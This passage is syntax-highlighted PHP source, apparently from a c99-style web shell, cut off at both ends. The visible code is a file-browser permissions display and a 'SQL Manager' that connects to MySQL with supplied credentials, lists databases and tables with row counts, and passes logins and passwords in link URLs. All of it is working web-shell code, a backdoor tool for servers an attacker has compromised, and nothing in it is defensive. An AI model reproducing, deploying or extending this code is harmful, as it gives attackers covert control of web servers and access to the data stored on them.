      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$wd</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
      <span class="nv">$wdt</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;[Read-Only]&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/p&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;div class=fright&amp;gt;</span>
<span class="x">    &amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;ls&quot;&amp;gt;</span>
<span class="x">    Directory: &amp;lt;input type=&quot;text&quot; name=&quot;d&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=submit value=&quot;Go&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/div&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="sd">/***********************/</span>
    <span class="sd">/** INFORMATION TABLE **/</span>
    <span class="sd">/***********************/</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table id=maininfo&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nv">$dspact</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;sql&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$sql_surl</span> <span class="o">=</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span>  <span class="p">{</span><span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span>   <span class="p">{</span><span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span>     <span class="p">{</span><span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);}</span>
      <span class="nv">$sql_surl</span> <span class="o">.=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;h4&amp;gt;Attention! MySQL Manager is &amp;lt;u&amp;gt;NOT&amp;lt;/u&amp;gt; a ready module! Don&#39;t reports bugs.&amp;lt;/h4&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;table&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> colspan=2 class=barheader&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$sql_sock</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$sql_server</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$sql_port</span><span class="p">,</span> <span class="nv">$sql_login</span><span class="p">,</span> <span class="nv">$sql_passwd</span><span class="p">);</span>
        <span class="nv">$err</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query</span> <span class="k">and</span> <span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">);</span> <span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$sql_sock</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="s2">&quot;.: SQL Manager :.&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_server</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;NO CONNECTION&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t connect! &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$sqlquicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Index&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Query&quot;</span><span class="p">,</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">));</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server-status&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=serverstatus&quot;</span><span class="p">);</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Server variables&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=servervars&quot;</span><span class="p">);</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=processes&quot;</span><span class="p">);</span>
        <span class="nv">$sqlquicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logout&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;MySQL &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; (proto v.&quot;</span><span class="o">.</span><span class="nb">mysql_get_proto_info</span> <span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running in &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; as &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (password - </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;}}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">28%</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2"> valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;li&amp;gt;If login is null, login is owner of process.&amp;lt;li&amp;gt;If host is null, host is localhost&amp;lt;/b&amp;gt;&amp;lt;li&amp;gt;If port is null, port is 3306 (default)&amp;lt;/td&amp;gt;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">90%</span><span class="se">\&quot;</span><span class="s2"> height=1 valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> border=0&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Please, fill the form:&amp;lt;/b&amp;gt;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Username&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Password&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Database&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$surl</span><span class="s2"> </span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">root</span><span class="se">\&quot;</span><span class="s2"> maxlength=</span><span class="se">\&quot;</span><span class="s2">64</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">password</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;\&quot;</span><span class="s2"> maxlength=</span><span class="se">\&quot;</span><span class="s2">64</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;\&quot;</span><span class="s2"> maxlength=</span><span class="se">\&quot;</span><span class="s2">64</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Host&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;PORT&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">localhost</span><span class="se">\&quot;</span><span class="s2"> maxlength=</span><span class="se">\&quot;</span><span class="s2">64</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">3306</span><span class="se">\&quot;</span><span class="s2"> maxlength=</span><span class="se">\&quot;</span><span class="s2">6</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">3</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Connect</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="c1">//Start left panel</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">))</span> <span class="p">{</span>
          <span class="cp">?&gt;</span><span class="x">&amp;lt;td width=&quot;25%&quot; height=&quot;100%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;Home&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span>
<span class="x">          </span><span class="cp">&lt;?php</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;---[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;&amp;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ]---&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;+&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/br&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No tables found in database.&quot;</span><span class="p">;}</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="cp">?&gt;</span><span class="x">&amp;lt;td width=&quot;1&quot; height=&quot;100&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;Home&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span>
<span class="x">          </span><span class="cp">&lt;?php</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="cp">?&gt;</span><span class="x">&amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;select name=&quot;sql_db&quot;&amp;gt;</span>
<span class="x">            </span><span class="cp">&lt;?php</span>
            <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$dbs</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_db</span> <span class="o">==</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span><span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot; selected&quot;</span><span class="p">;}</span> <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span 